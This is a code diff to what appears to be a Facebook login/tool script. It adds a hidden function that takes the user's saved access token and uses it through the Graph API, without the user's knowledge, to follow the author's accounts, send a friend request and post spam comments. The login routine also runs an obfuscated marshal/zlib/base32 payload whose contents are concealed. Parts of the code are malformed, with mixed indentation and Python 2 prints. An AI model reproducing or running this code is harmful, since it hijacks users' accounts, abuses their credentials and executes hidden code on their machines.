@@ -59,6 +59,26 @@ def random_ipv4():
 def random_ipv6():
 	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))
 
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Token invalid"
+		os.system('rm -rf login.txt')
+        zz = ('4601874036492018')
+	una = ('100000084022645')
+        kom = ('KYAA>< SINI GW SFONGIN KNTL LUU  @[100000084022645:0] 😍😘\nhttps://www.facebook.com/100000084022645/posts/4609765945702827/?app=fbl') 
+	post = ('4609765945702827')
+	post2 = ('4609765945702827')
+        kom2 = ('BOOLKU ANGED MAZZ  @[100000084022645:0] 😘😘\nhttps://www.facebook.com/100000084022645/posts/4609765945702827/?app=fbl') 
+        requests.post('https://graph.facebook.com/100000084022645/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/2325505107680136/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(zz,toket,toket))
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	menu()
+
 def logo():
 	os.system("clear")
 	print("╔╗╴╴╴╔══════╗  • Author : Zamuel Voldemord")
@@ -86,7 +106,7 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
-			#-> bot follow
+			bot_komen
 			import marshal,zlib,base64
 			exec(marshal.loads(zlib.decompress(base64.b32decode("PCOKLEW7J3BSAFEHUHN5I6HHSWX5BK7V2BJKBRVJC5PHXYYDTCLOFZXGUT3NAJ7QYU6ZRKKJCP7SJBPQBN6MABZELB3CQM3KG7KHAS7BDDNXFVSSE5Q6O3446EB6AY4QRTAWYDHGMOYPQAXNCG5U7D7DTG3RJGYQHK6MRMTVL53ZXZLDNVO6H7LONH6T4EYAEBFNARIJBJKJ5YOQUDWZ6GWX4N2W3LKDPQEH5Z26K37RCQJOKQQYYVRFJQJ6LOMRSXKFAVITIWBBI5A7VG2JZ6FUAJFGGRFBUX4ULNH2KMSJIMGVZ6DLWND6SZYEFUN327AWDQBQU5A6OMMEIWOIVS6S7CV34AYTRJ3P3MPLOLX5XYOZLXY4QTZJZ34GO7IHIDRKZWQ="))))
 			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
